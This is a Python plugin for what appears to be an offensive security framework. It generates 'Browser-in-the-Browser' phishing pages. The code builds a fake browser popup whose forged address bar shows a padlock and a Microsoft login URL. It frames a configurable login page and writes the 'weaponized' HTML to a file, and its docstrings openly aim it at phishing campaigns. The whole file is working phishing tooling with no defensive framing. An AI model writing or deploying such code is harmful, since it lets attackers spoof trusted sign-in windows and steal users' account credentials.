from omnistrike.plugins.base import BasePlugin
import os

class BitBGeneratorPlugin(BasePlugin):
    """
    Generates 'Browser-in-the-Browser' (BitB) templates for elite phishing campaigns.
    """
    @property
    def name(self):
        return "BitBGenerator"

    @property
    def description(self):
        return "Generates Browser-in-the-Browser (BitB) phishing templates for sophisticated social engineering."

    async def run(self, target, data):
        print(f"[*] Generating BitB templates for {target}...")

        # Template definition (simplified HTML/CSS)
        bitb_template = """
        <!-- BitB Template: Fake Browser Window -->
        <div id="bitb-window" style="width: 800px; height: 600px; border: 1px solid #ccc; position: absolute; top: 50px; left: 50px; box-shadow: 0 0 20px rgba(0,0,0,0.5); font-family: sans-serif;">
            <div id="bitb-header" style="background: #f1f1f1; padding: 10px; display: flex; align-items: center; border-bottom: 1px solid #ddd;">
                <div style="display: flex; gap: 5px;">
                    <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f56;"></div>
                    <div style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></div>
                    <div style="width: 12px; height: 12px; border-radius: 50%; background: #27c93f;"></div>
                </div>
                <div id="bitb-address-bar" style="margin-left: 20px; background: #fff; flex-grow: 1; padding: 5px 10px; border-radius: 20px; border: 1px solid #ddd; font-size: 14px; display: flex; align-items: center;">
                    <span style="color: #27c93f; margin-right: 10px;">🔒</span>
                    <span id="fake-url">https://login.microsoftonline.com/common/oauth2/v2.0/authorize</span>
                </div>
            </div>
            <div id="bitb-content" style="height: calc(100% - 46px); background: #fff;">
                <!-- Target Login Form Here -->
                <iframe src="{login_url}" style="width: 100%; height: 100%; border: none;"></iframe>
            </div>
        </div>
        """

        # Logic to "weaponize" based on target
        target_login = data.get('target_login_url', 'https://login.microsoftonline.com')
        weaponized_html = bitb_template.format(login_url=target_login)

        output_file = f"bitb_{target.replace('.', '_')}.html"
        with open(output_file, 'w') as f:
            f.write(weaponized_html)

        data['bitb_template_path'] = output_file
        print(f"[!!!] SUCCESS: Elite BitB template generated at {output_file}")

        return data
